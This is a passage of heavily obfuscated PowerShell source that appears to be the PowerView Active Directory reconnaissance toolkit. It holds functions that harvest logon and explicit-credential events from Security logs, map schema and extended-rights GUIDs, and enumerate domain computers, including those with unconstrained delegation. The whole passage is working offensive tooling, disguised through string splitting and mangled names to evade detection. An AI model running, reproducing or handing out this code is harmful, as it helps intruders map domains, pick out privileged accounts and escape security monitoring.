'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pro'+'vi'+'der[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Nam'+'e=jbA'+'Microsoft-'+'W'+'indows-Security'+'-'+'A'+'udi'+'tingjbA
'+' ')."ReP`l`AcE"('jbA',[sTring][ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'(Level='+'4 '+'or'+' '+'Leve'+'l'+'=0) '+'and'+' '+'('+'EventID'+'='+'4624)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d '+'Time'+'C'+'re'+'ated[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@S'+'yste'+'mTime&gt;'+'=OTbJVp(J'+'Vp'+'Star'+'tTime'+'.ToU'+'ni'+'vers'+'alTime'+'()'+'.ToSt'+'ri'+'ng'+'(OTbsOTb'+')'+')'+'OTb'+' ')  -cREPLaCe 'OTb',[cHar]39-cREPLaCe  'JVp',[cHar]36)+'and'+' '+(('@SystemT'+'ime&l'+'t;='+'pl'+'TXJC(XJCEndTim'+'e.T'+'oUniversalT'+'im'+'e('+').T'+'oS'+'tri'+'ng('+'plTspl'+'T))plT'+'
'+' ') -REpLacE 'XJC',[Char]36-REpLacE  ([Char]112+[Char]108+[Char]84),[Char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('*['+'EventDat'+'a[Da'+'ta[@N'+'ame=KJV'+'Targ'+'et'+'UserNameKJV] ')."R`e`pLACE"('KJV',[sTRINg][CHar]39)+'!'+'= '+('gbIAN'+'ONYM'+'OUS ')."REp`l`Ace"(([ChAr]103+[ChAr]98+[ChAr]73),[STriNG][ChAr]39)+('LOGONED'+'R]]
'+' ')."Repla`cE"(([ChAR]69+[ChAR]68+[ChAR]82),[StRing][ChAR]39)+' '+' '+' '+' '+' '+' '+' '+'</S'+'el'+'e'+'ct>

 '+' '+' '+' '+' '+' '+' '+' '+'<!'+'-- '+'L'+'ogo'+'n '+'wi'+'th '+'ex'+'plicit'+' '+'cr'+'edent'+'ial '+'eve'+'nts '+'--'+'>
 '+' '+' '+' '+' '+' '+' '+' '+'<Selec'+'t '+('Path'+'=AQcSecu'+'r'+'it'+'y'+'AQ'+'c>
 ')."re`plAce"(([chAr]65+[chAr]81+[chAr]99),[sTRinG][chAr]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Syst'+'em['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pro'+'vider['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@Na'+'me=cIqM'+'icr'+'osoft'+'-W'+'i'+'nd'+'ows-Secur'+'i'+'ty'+'-'+'A'+'uditingc'+'Iq
 ')  -cReplacE 'cIq',[cHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd '+'(Lev'+'el=4'+' '+'o'+'r '+'Le'+'vel=0'+') '+'a'+'nd '+'(EventID=4'+'6'+'4'+'8)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'and'+' '+'T'+'imeC'+'reat'+'ed'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('@SystemTime&gt'+';=AenAoq'+'(AoqStar'+'tTime.ToU'+'nivers'+'alTime().T'+'o'+'Strin'+'g(A'+'ens'+'A'+'en'+'))Aen ') -RepLaCe([ChAR]65+[ChAR]111+[ChAR]113),[ChAR]36 -crEplACE  'Aen',[ChAR]39)+'an'+'d '+('@SystemTi'+'m'+'e'+'&'+'lt;='+'wVJRNF(RNFEndT'+'ime.ToUn'+'iversalTime'+'('+')'+'.T'+'oStr'+'ing(wV'+'Jsw'+'V'+'J)'+')wVJ
 ')."rEpL`Ace"(([cHar]82+[cHar]78+[cHar]70),[stRiNg][cHar]36)."r`ePLaCE"(([cHar]119+[cHar]86+[cHar]74),[stRiNg][cHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+'</S'+'elect>

'+' '+' '+' '+' '+' '+' '+' '+' '+'<'+'S'+'uppress '+(('Path'+'='+'IeU'+'S'+'ecurityIeU>
 ')-REplacE  ([chAR]73+[chAR]101+[chAR]85),[chAR]34)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Sys'+'tem'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pr'+'ov'+'i'+'der[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Na'+'m'+'e=n'+'qSMi'+'crosoft-Windows'+'-S'+'ecu'+'ri'+'ty-'+'Audi'+'tingnqS'+'
'+' ')."Re`P`laCe"('nqS',[StRing][CHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'a'+'nd
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(L'+'eve'+'l=4 '+'o'+'r '+'Lev'+'el=0) '+'an'+'d '+'(Ev'+'entI'+'D=4624'+' '+'o'+'r '+'Ev'+'entID='+'4625'+' '+'or'+' '+'E'+'ven'+'tID=463'+'4'+')
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'an'+'d
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*[
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Even'+'tD'+'at'+'a[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'('+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('(Data'+'[@N'+'a'+'me=LI0Log'+'o'+'nTy'+'peLI0]=LI05'+'LI0 ')  -rEPlacE([cHAr]76+[cHAr]73+[cHAr]48),[cHAr]39)+'or'+' '+('Da'+'ta[@'+'Name=ySML'+'ogo'+'nTyp'+'e'+'ySM]'+'=yS'+'M0ySM'+')
'+' ')."rEplA`CE"(([cHar]121+[cHar]83+[cHar]77),[STRING][cHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'r
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+(('D'+'ata'+'[@Name=hiHTa'+'rgetUserN'+'ame'+'h'+'i'+'H]=hiH'+'ANO'+'NYMOUS ') -CRepLACe([chAR]104+[chAR]105+[chAR]72),[chAR]39)+('LO'+'G'+'ON{0'+'}
 ')  -f  [CHAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'o'+'r
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Da'+'ta'+'[@N'+'am'+'e={'+'0'+'}'+'Ta'+'rgetUs'+'erSID{0}]={0}S-1-5-18{0}'+'
'+' ')  -f[CHAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+')
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+']
'+' '+' '+' '+' '+' '+' '+' '+' '+'</S'+'uppr'+'ess>
 '+' '+' '+' '+('</Qu'+'er'+'y>
<'+'/'+'QueryLi'+'st>
S1P')."ReP`la`cE"('S1P',[sTRING][ChAR]34))
        ${EVeNta`Rgu`Me`NtS} = @{
            ("{1}{0}{2}"-f 'ilter','F','XPath') = ${x`pA`ThF`iLtEr}
            ("{0}{1}" -f'LogNam','e') = ("{1}{2}{0}"-f'rity','Sec','u')
            ("{1}{0}{2}" -f 'Event','Max','s') = ${maxe`VeN`Ts}
        }
        if (${pSbouN`DPara`MeT`ers}[("{0}{3}{1}{2}"-f 'C','i','al','redent')]) { ${EV`enTa`RgUMe`NTS}[("{1}{0}{2}"-f'i','Credent','al')] = ${cRE`deNT`I`AL} }
    }

    PROCESS {
        ForEach (${cOM`PUt`ER} in ${Co`mPUtEr`NAme}) {

            ${e`VeNTarGuM`E`N`TS}[("{2}{3}{0}{1}"-f'er','Name','Com','put')] = ${COMp`U`Ter}

            &("{2}{1}{0}{3}"-f'WinEven','et-','G','t') @EventArguments| &("{3}{1}{0}{2}"-f'Each-Objec','or','t','F') {
                ${e`VEnt} = ${_}
                ${P`R`OpErtIes} = ${EV`eNt}."p`RoPer`TiEs"
                Switch (${E`VE`Nt}."i`d") {
                    
                    4624 {
                        
                        if(-not ${P`Ro`p`erTIEs}[5]."vA`LuE".("{0}{1}" -f'En','dsWith').Invoke('$')) {
                            ${o`UtP`Ut} = &("{0}{1}{2}"-f'New','-Obje','ct') ("{2}{1}{0}" -f'Object','S','P') -Property @{
                                ("{1}{0}{3}{2}"-f'erN','Comput','e','am')              = ${Co`m`PuTer}
                                ("{0}{2}{1}" -f'TimeC','ated','re')               = ${E`Ve`NT}."tiMec`R`EatED"
                                ("{0}{1}{2}" -f'Ev','ent','Id')                   = ${Ev`ent}."I`D"
                                ("{3}{2}{0}{1}" -f 'se','rSid','ectU','Subj')            = ${p`RoPE`RTIeS}[0]."va`Lue".("{2}{1}{0}"-f'String','o','T').Invoke()
                                ("{1}{0}{2}{3}" -f 'u','S','bjectU','serName')           = ${P`Ro`pER`TiES}[1]."vAL`UE"
                                ("{1}{3}{2}{4}{5}{0}"-f 'e','S','bjectDomain','u','N','am')         = ${pR`OPER`TiEs}[2]."vA`LuE"
                                ("{2}{0}{1}"-f 'u','bjectLogonId','S')            = ${p`R`Op`erTIES}[3]."Va`lue"
                                ("{0}{3}{1}{2}"-f'T','rgetU','serSid','a')             = ${pRO`Pert`IES}[4]."va`LUE".("{2}{1}{0}" -f'ring','St','To').Invoke()
                                ("{1}{2}{0}{3}" -f'rNa','Ta','rgetUse','me')            = ${P`RoPerT`Ies}[5]."V`ALuE"
                                ("{3}{0}{1}{2}"-f'et','Domain','Name','Targ')          = ${Pr`oper`TieS}[6]."vAl`Ue"
                                ("{0}{3}{1}{2}" -f'T','get','LogonId','ar')             = ${pRO`per`TIes}[7]."V`AluE"
                                ("{2}{0}{1}" -f 'n','Type','Logo')                 = ${PROp`ER`TIES}[8]."Val`UE"
                                ("{2}{3}{0}{4}{1}"-f'o','me','Lo','gonPr','cessNa')          = ${P`ROp`eRtI`eS}[9]."va`LuE"
                                ("{4}{0}{3}{2}{1}"-f'ionPa','geName','a','ck','Authenticat') = ${PrOp`er`TIes}[10]."va`luE"
                                ("{4}{1}{0}{3}{2}"-f'ati','t','ame','onN','Works')           = ${prO`p`ErTies}[11]."V`ALue"
                                ("{2}{1}{0}" -f'nGuid','o','Log')                 = ${pr`OP`ERtIES}[12]."va`Lue"
                                ("{2}{5}{4}{0}{1}{3}"-f 'edServ','ice','Tra','s','smitt','n')       = ${Prope`Rt`ieS}[13]."vA`LUE"
                                ("{4}{1}{0}{3}{2}"-f'cka','mPa','e','geNam','L')             = ${pRO`P`eRTieS}[14]."vA`luE"
                                ("{1}{2}{0}"-f'ength','Ke','yL')                 = ${PrO`peRT`IES}[15]."V`ALue"
                                ("{0}{1}{2}"-f'Proc','ess','Id')                 = ${prOP`e`R`TIes}[16]."va`lUE"
                                ("{2}{3}{1}{0}"-f 'me','a','Pro','cessN')               = ${p`R`OPeRtiES}[17]."va`LUE"
                                ("{2}{0}{3}{1}" -f 'd','ss','IpAd','re')                 = ${PR`Oper`TI`ES}[18]."vA`Lue"
                                ("{1}{0}"-f'rt','IpPo')                    = ${PR`Op`e`Rties}[19]."Va`lue"
                                ("{4}{2}{1}{0}{3}" -f'n','natio','so','Level','Imper')        = ${pROp`er`TI`ES}[20]."v`Alue"
                                ("{1}{4}{0}{3}{2}{5}" -f 'i','R','minMod','ctedAd','estr','e')       = ${P`R`oPeRti`ES}[21]."V`AlUE"
                                ("{3}{5}{1}{4}{0}{2}" -f'r','n','Name','Ta','dUse','rgetOutbou')    = ${prOPE`R`TIes}[22]."Va`luE"
                                ("{3}{2}{6}{4}{0}{1}{5}" -f'ainNa','m','utboundD','TargetO','m','e','o')  = ${ProP`ErTI`eS}[23]."v`AlUE"
                                ("{2}{0}{1}{3}" -f'tualAcco','un','Vir','t')            = ${Pr`op`eRt`IES}[24]."Val`UE"
                                ("{5}{1}{2}{4}{3}{0}"-f'd','getLi','nke','nI','dLogo','Tar')       = ${P`ROperTI`ES}[25]."V`ALUE"
                                ("{3}{2}{0}{1}"-f'oke','n','atedT','Elev')             = ${P`RoPer`T`ieS}[26]."VAl`UE"
                            }
                            ${OU`Tp`Ut}."P`sobJEcT"."TyPeN`Am`Es".("{0}{1}"-f'In','sert').Invoke(0, ("{1}{3}{4}{2}{0}" -f 'ogonEvent','Po','ew.L','we','rVi'))
                            ${ou`TpuT}
                        }
                    }

                    
                    4648 {
                        
                        if((-not ${p`R`OpeR`TIES}[5]."V`ALUe".("{1}{2}{0}"-f 'h','E','ndsWit').Invoke('$')) -and (${PR`opE`RtIEs}[11]."VaL`Ue" -match ((("{3}{2}{1}{0}{4}" -f 'kh','s','a','t','ostgsq.exe'))."REpl`A`cE"('gsq',[sTRing][cHaR]92)))) {
                            ${o`U`TpUT} = &("{3}{2}{0}{1}"-f 'jec','t','Ob','New-') ("{1}{0}" -f 'ect','PSObj') -Property @{
                                ("{3}{2}{0}{1}" -f'ter','Name','u','Comp')              = ${CO`MPutER}
                                ("{2}{0}{1}{3}"-f 'm','eCreate','Ti','d')       = ${E`V`enT}."t`i`MECr`EAteD"
                                ("{1}{0}" -f 'ntId','Eve')           = ${eve`Nt}."I`d"
                                ("{0}{2}{1}{3}{4}" -f'Su','jectU','b','s','erSid')    = ${p`R`OpErTIES}[0]."v`ALUe".("{1}{0}" -f'ring','ToSt').Invoke()
                                ("{0}{2}{1}"-f'Subjec','me','tUserNa')   = ${p`R`OP`eRtiEs}[1]."VA`lue"
                                ("{0}{3}{1}{2}{4}" -f 'S','bjectDoma','i','u','nName') = ${p`R`operTIeS}[2]."val`UE"
                                ("{4}{1}{2}{3}{0}" -f'd','e','ctLo','gonI','Subj')    = ${PrO`PE`R`TIES}[3]."V`ALue"
                                ("{2}{1}{0}"-f 'nGuid','o','Log')         = ${PR`o`pErTieS}[4]."VA`lue".("{0}{1}{2}"-f 'T','oStri','ng').Invoke()
                                ("{1}{3}{0}{2}" -f'UserNa','T','me','arget')    = ${p`R`OpERTiES}[5]."vA`LUE"
                                ("{2}{0}{1}{3}"-f 'rge','tDom','Ta','ainName')  = ${p`RO`Per`TieS}[6]."Va`Lue"
                                ("{0}{1}{2}{3}" -f 'T','arget','L','ogonGuid')   = ${Pr`OPe`RTIES}[7]."VAl`Ue"
                                ("{4}{0}{3}{2}{1}" -f 'ar','erverName','tS','ge','T')  = ${pROp`er`Ti`es}[8]."v`AluE"
                                ("{1}{2}{0}"-f'Info','Targ','et')        = ${p`R`oPerTIeS}[9]."vA`LUE"
                                ("{1}{0}{2}" -f'c','Pro','essId')         = ${prop`Erti`Es}[10]."Va`LUE"
                                ("{1}{0}{2}"-f'Nam','Process','e')       = ${proP`eR`T`Ies}[11]."val`Ue"
                                ("{1}{0}{2}" -f'd','IpAd','ress')         = ${pRO`Per`Ties}[12]."vaL`UE"
                                ("{1}{2}{0}" -f 'rt','Ip','Po')            = ${prOpe`R`Ti`eS}[13]."Va`luE"
                            }
                            ${O`UTpuT}."p`SOb`JecT"."T`Ype`NAMES".("{0}{2}{1}" -f'I','sert','n').Invoke(0, ("{4}{8}{6}{3}{7}{0}{5}{2}{1}"-f 'eden','vent','alLogonE','it','PowerVie','ti','xplic','Cr','w.E'))
                            ${O`Utp`Ut}
                        }
                    }
                    ("{0}{1}"-f'd','efault') {
                        &("{2}{4}{3}{0}{1}" -f 'i','ng','Wri','arn','te-W') "No handler exists for event ID: $($Event.Id) "
                    }
                }
            }
        }
    }
}


function g`e`T-DomAI`NgUIDmap {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{1}{0}"-f'ess','dProc','PS','Shoul'}, '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        ${D`om`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{0}{1}{4}{2}" -f'nC','ont','oller','Domai','r'})]
        [String]
        ${seRv`er},

        [ValidateRange(1, 10000)]
        [Int]
        ${ReSU`ltP`A`ges`iZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seR`VeR`T`I`Mel`iMIT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cRe`dENti`Al} =   ${jH3`X`o6}::"E`MPty"
    )

    ${Gu`I`Ds} = @{("{4}{2}{8}{9}{0}{6}{1}{5}{7}{3}"-f'00','00-00000','0000','00','0000','00','00-00','000','-0','000-') = 'All'}

    ${foRe`StA`R`GUM`ENTS} = @{}
    if (${P`SBou`NdpaR`AMeteRS}[("{2}{0}{1}"-f'redent','ial','C')]) { ${Fo`REs`Tar`gUmEntS}[("{2}{1}{3}{0}" -f 'ial','e','Cr','dent')] = ${C`REd`eN`Tial} }

    try {
        ${ScHEM`Ap`A`TH} = (&("{2}{1}{0}"-f 't','es','Get-For') @ForestArguments)."s`cHEma"."Na`me"
    }
    catch {
        throw ("{14}{12}{4}{15}{18}{17}{6}{5}{19}{16}{1}{0}{8}{10}{9}{3}{11}{7}{13}{2}" -f'for','ing ',' Get-Forest','p','G','re','n ','th ','est ','ema ','sch','a','-Domain','from','[Get','UIDMap','ev',' i','] Error','tri')
    }
    if (-not ${scHem`APa`TH}) {
        throw ("{10}{1}{11}{9}{12}{5}{13}{7}{6}{3}{2}{8}{4}{0}" -f 'et-Forest','Ge','eving forest schema p','tri','rom G','UI','re','p] Error in ','ath f','a','[','t-Dom','inG','DMa')
    }

    ${SeArcH`Er`Arg`Umen`Ts} = @{
        ("{1}{2}{0}"-f 'hBase','Se','arc') = ${Sc`H`EMApaTh}
        ("{1}{0}{2}{3}"-f 'PF','LDA','ilt','er') = (("{2}{0}{1}" -f'IDGU','ID=*)','(schema'))
    }
    if (${PsbOuNDP`A`RAMe`T`ErS}[("{1}{0}{2}"-f'ma','Do','in')]) { ${sEARcHER`ArG`UMEN`Ts}[("{1}{0}"-f 'n','Domai')] = ${DOm`Ain} }
    if (${p`SbO`UNdPar`A`METeRs}[("{2}{0}{1}"-f'rv','er','Se')]) { ${s`Earch`e`R`ARGumENtS}[("{1}{0}" -f'ver','Ser')] = ${sERV`er} }
    if (${Psb`O`UNDP`ARAM`ETeRs}[("{2}{3}{0}{1}" -f 'iz','e','ResultP','ageS')]) { ${SEARc`HE`RArg`UMeN`Ts}[("{2}{1}{3}{0}" -f 'ageSize','su','Re','ltP')] = ${rE`suL`TpAgE`si`ze} }
    if (${psboU`Nd`pA`RAmeterS}[("{0}{1}{2}" -f 'S','erver','TimeLimit')]) { ${SE`Ar`cheRARgUm`e`Nts}[("{0}{2}{3}{1}"-f'Serv','t','erTimeLim','i')] = ${S`er`V`eRtimELi`mit} }
    if (${pSB`OUNd`pAr`Ame`Ters}[("{0}{1}{2}"-f'C','reden','tial')]) { ${seA`RC`H`eR`ArGUmEn`TS}[("{0}{2}{1}{3}"-f 'Crede','i','nt','al')] = ${CR`EDeNt`Ial} }
    ${scheM`ASea`Rc`hER} = &("{3}{0}{2}{1}{4}"-f '-Doma','r','inSea','Get','cher') @SearcherArguments

    if (${sc`h`e`MAsEaRCher}) {
        try {
            ${REsUL`TS} = ${sCHE`ma`Se`A`RCHer}.("{0}{1}{2}" -f'Fi','nd','All').Invoke()
            ${R`eSU`Lts} | &("{0}{2}{1}"-f 'W','ere-Object','h') {${_}} | &("{0}{2}{1}" -f'ForEach-Ob','ect','j') {
                ${GuI`dS}[(&("{0}{2}{1}" -f'N','ect','ew-Obj') ("{1}{0}"-f 'id','Gu') (,${_}."P`ROP`ERTIes"."sCHem`Ai`d`GuID"[0]))."GU`iD"] = ${_}."prO`pert`Ies"."Na`me"[0]
            }
            if (${r`eSUlts}) {
                try { ${rES`UL`Ts}.("{1}{0}"-f 'ispose','d').Invoke() }
                catch {
                    &("{2}{3}{1}{0}" -f 'bose','-Ver','Wri','te') ('['+'Ge'+'t-Domai'+'nGUIDMap] '+'E'+'rror '+'d'+'isposin'+'g '+'of'+' '+'t'+'he '+'Resul'+'t'+'s '+'ob'+'ject'+': '+"$_")
                }
            }
            ${sc`he`masEa`R`chER}.("{0}{1}" -f'dis','pose').Invoke()
        }
        catch {
            &("{0}{1}{3}{2}"-f 'Wr','ite-Ve','e','rbos') ('[Get'+'-D'+'o'+'ma'+'in'+'GUIDMap] '+'Err'+'o'+'r '+'i'+'n '+'b'+'ui'+'lding '+'GUID'+' '+'m'+'ap: '+"$_")
        }
    }

    ${seA`RC`hERA`RGumeN`Ts}[("{0}{2}{1}" -f'Searc','e','hBas')] = ${s`cHEmAp`ATh}.("{1}{0}" -f 'e','replac').Invoke(("{1}{0}" -f 'a','Schem'),("{1}{0}{3}{2}"-f'ended-Righ','Ext','s','t'))
    ${s`EArcHEraR`gU`MeNTS}[("{0}{1}{2}" -f 'LDA','PFilt','er')] = (("{6}{3}{1}{7}{8}{4}{0}{5}{2}" -f 'lA','l',')','tC','contro','ccessRight','(objec','ass','='))
    ${RIG`h`Ts`seARcHer} = &("{3}{2}{1}{0}" -f'cher','mainSear','et-Do','G') @SearcherArguments

    if (${rIgHt`s`seArCh`ER}) {
        try {
            ${rEs`U`LTS} = ${RiGhTssEar`C`H`Er}.("{0}{1}{2}"-f'Fi','nd','All').Invoke()
            ${Re`S`UlTs} | &("{3}{2}{0}{1}" -f'-Objec','t','re','Whe') {${_}} | &("{2}{1}{0}"-f't','orEach-Objec','F') {
                ${GU`iDs}[${_}."PROper`T`IEs"."Ri`gH`T`sguId"[0].("{2}{0}{1}" -f'Strin','g','to').Invoke()] = ${_}."prOp`ErTI`es"."Na`ME"[0]
            }
            if (${re`S`UlTs}) {
                try { ${RE`su`Lts}.("{1}{0}"-f 'spose','di').Invoke() }
                catch {
                    &("{3}{1}{0}{2}"-f 'b','Ver','ose','Write-') ('[Get-D'+'oma'+'inGU'+'ID'+'Map]'+' '+'Erro'+'r '+'di'+'s'+'p'+'osing '+'o'+'f '+'the'+' '+'R'+'esult'+'s '+'o'+'bjec'+'t: '+"$_")
                }
            }
            ${RI`gH`TsS`E`ArCHER}.("{1}{2}{0}" -f 'ose','d','isp').Invoke()
        }
        catch {
            &("{3}{0}{2}{1}"-f 'te-','se','Verbo','Wri') ('[G'+'et-Do'+'mai'+'nGU'+'IDMap]'+' '+'Error'+' '+'i'+'n '+'b'+'ui'+'lding '+'GUI'+'D '+'map:'+' '+"$_")
        }
    }

    ${gu`ids}
}


function G`ET`-DoM`AiNCOmPUteR {


    [OutputType({"{3}{5}{4}{0}{2}{1}"-f 'rView','er','.Comput','Po','e','w'})]
    [OutputType({"{3}{2}{0}{1}" -f 'uter.Ra','w','owerView.Comp','P'})]
    [CmdletBinding()]
    Param (
        [Parameter(pOSITIon = 0, vAlUefRoMpiPeLIne = ${t`Rue}, ValUEFrOmPIPelineBYprOPErtyNaMe = ${tR`Ue})]
        [Alias({"{1}{0}{3}{2}" -f 'a','S','ountName','mAcc'}, {"{0}{1}" -f 'N','ame'}, {"{2}{0}{1}"-f'NSHostNam','e','D'})]
        [String[]]
        ${I`dEn`TITY},

        [Switch]
        ${u`NCOnST`RaINED},

        [Switch]
        ${TRuStedt`oA`U`TH},

        [Switch]
        ${PRin`T`ers},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{5}{3}{2}{0}{4}" -f'ipa','Se','ePrinc','ic','lName','rv'})]
        [String]
        ${s`Pn},

        [ValidateNotNullOrEmpty()]
        [String]
        ${o`PERat`iNGs`ysTEm},

        [ValidateNotNullOrEmpty()]
        [String]
        ${SERv`Ice`pa`Ck},

        [ValidateNotNullOrEmpty()]
        [String]
        ${si`TeN`AmE},

        [Switch]
        ${P`ING},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dO`mA`In},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ter','Fil'})]
        [String]
        ${ld`A`PFILtER},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PR`oPert`Ies},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f'h','ADSPat'})]
        [String]
        ${sEA`RC`h`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{4}{2}{1}{0}" -f 'r','rolle','nCont','D','omai'})]
        [String]
        ${SERv`Er},

        [ValidateSet({"{0}{1}"-f'Ba','se'}, {"{1}{0}" -f'Level','One'}, {"{0}{1}{2}"-f'Su','b','tree'})]
        [String]
        ${S`eArCH`SC`OPe} = ("{1}{0}{2}"-f 'bt','Su','ree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResU`ltP`Ag`EsizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`E`RVe`RTIMElI`mIT},

        [ValidateSet({"{0}{1}" -f'Dac','l'}, {"{1}{0}"-f 'p','Grou'}, {"{1}{0}" -f'e','Non'}, {"{0}{1}" -f'Owne','r'}, {"{1}{0}" -f 'acl','S'})]
        [String]
        ${s`e`c`UriTym`ASks},

        [Switch]
        ${TO`MBStO`NE},

        [Alias({"{1}{0}" -f 'e','ReturnOn'})]
        [Switch]
        ${Fi`NdOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREdeNt`i`AL} =   ${J`h3XO6}::"Em`pTY",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${u`A`cVAluEnaMes} =  (  &("{0}{2}{1}"-f 'v','able','ArI') ('1QyB'+'I')  -vaLUEo )::("{0}{2}{1}" -f 'Ge','mes','tNa').Invoke(${Uac`En`UM})
        
        ${UAcV`A`LuenaM`ES} = ${uAcVa`l`UEnameS} | &("{1}{3}{2}{0}"-f 'ct','ForE','bje','ach-O') {${_}; "NOT_$_"}
        
        &("{4}{2}{1}{3}{0}"-f'micParameter','y','-D','na','New') -Name ("{0}{1}{2}" -f 'UACFil','t','er') -ValidateSet ${UA`C`VALUE`N`AMEs} -Type ([array])
    }

    BEGIN {
        ${S`EaRcHe`RarG`Ume`Nts} = @{}
        if (${psB`OUN`dp`ArAMETeRS}[("{0}{1}{2}" -f'D','omai','n')]) { ${sear`chERA`RgUM`e`Nts}[("{0}{1}" -f 'Do','main')] = ${dOMa`In} }
        if (${psBou`Nd`P`ARamete`Rs}[("{0}{2}{1}{3}" -f'P','e','rop','rties')]) { ${SeaRcHE`Ra`Rg`U`mENts}[("{1}{0}{2}"-f'ertie','Prop','s')] = ${p`R`O`pertIes} }
        if (${p`sbOUn`DP`AR`Am`eTERS}[("{2}{0}{1}" -f 'earchBa','se','S')]) { ${SEA`RcHe`RA`Rg`UmENts}[("{0}{2}{1}{3}" -f'Sea','chBas','r','e')] = ${SeA`RcHB`ASe} }
